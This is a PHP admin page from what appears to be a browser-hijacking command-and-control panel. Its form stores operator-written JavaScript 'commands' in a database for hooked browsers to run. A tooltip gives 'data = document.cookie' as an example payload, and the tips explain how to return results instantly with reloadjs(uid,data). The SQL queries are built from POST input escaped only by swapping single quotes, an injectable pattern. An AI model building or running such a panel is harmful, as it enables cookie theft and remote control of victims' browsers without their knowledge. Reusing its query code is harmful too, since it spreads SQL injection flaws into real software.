<?php
include('login.php');
define('allowed',true);
include('../db.php');
include('header.php');
$name = str_replace("'","\\'",$_POST['name']);
$code = str_replace("'","\\'",$_POST['code']);
if (($name != "") && ($code != "")) {
    //Submit a new function
    if ($mysqli->query("INSERT INTO functions (name,code) VALUES ('".$name."','".$code."');") === TRUE)
        echo "<p style='color:#00CC00;font-size:20px'>Success!</p>";        
    else
        if ($mysqli->query("UPDATE functions SET code='".$code."' WHERE name='".$name."';") === TRUE)
            echo "<p style='color:#00CC00;font-size:20px'>Command replaced!</p>";
        else
            echo "<p style='color:#FF0000;font-size:20px'>Error in the submission!</p>";
}
?>
    <div class="content">
        <p>
            <h1>Insert a new command</h1>
        </p>
        <p>
            <form action="" method="POST">
                <p>Name (<a href="#" ctitle="The name must be unique, otherwise the existent command will be replaced" class="tooltip">?</a>): <input type="text" name="name" value="<?php echo htmlentities($_GET['n']); ?>"/><p>
                <p>Code (<a href="#" ctitle="Use the special variable called data to get a response. Example: data = document.cookie;  Attention: data can't be null, if you want to execute a void function assign a value to data, like data=0." class="tooltip">?</a>):<br>
                <textarea name="code"><?php echo htmlentities($_GET['c']); ?></textarea>
                </p>
                <p><input type="submit" value="Send!" /></p>
            </form>
        </p>
        <br>
        <p>
            <h3>Tips:</h3>
            <ul style="margin-left:20%;text-align:left">
                <li>Assign always a value to data</li>
                <li>Don't use // to make a comment, but instead use /* comment */</li>
                <li>Leave // at the end of your code to block the script (it won't execute until a page refresh)</li>
                <li>In your code call reloadjs(uid,data) to get instantly the response. (Example: data=1+1;reloadjs(uid,data);//)</li>
            </ul>
        </p>
   </div>
</body>
</html>
<?php
$mysqli->close();
?>
